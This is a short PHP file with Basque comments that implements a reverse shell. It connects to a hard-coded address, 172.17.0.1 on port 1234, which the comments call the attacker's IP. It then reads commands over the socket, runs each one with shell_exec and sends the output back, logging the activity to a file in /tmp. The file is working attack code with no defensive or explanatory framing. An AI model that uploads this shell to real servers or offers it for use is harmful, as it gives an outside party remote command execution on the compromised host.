<?php
$ip = '172.17.0.1';  // Erasotzailearen IPa
$port = 1234;         // Entzuten egongo den portua

// Konektatu erasotzailearen makinara
$sock = fsockopen($ip, $port);
if (!$sock) {
    file_put_contents('/tmp/reverse_shell_log.txt', "Errorea konektatzean $ip:$port\n", FILE_APPEND);
    die("Errorea konektatzean.");
}

file_put_contents('/tmp/reverse_shell_log.txt', "Konexioa hemendik buruta da: " . $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);

// Komandoak irakurri eta exekutatu
while ($cmd = fread($sock, 2048)) {
    // Konexioan komandoa ondo jaso dela ikusteko log baten gorde
    file_put_contents('/tmp/reverse_shell_log.txt', "Jasotako komandoa: $cmd\n", FILE_APPEND);
    $output = shell_exec($cmd);

    // Irteera erasotzaileari bidali
    fwrite($sock, $output);
}

// Socketa itxi amaitzean
fclose($sock);
?>
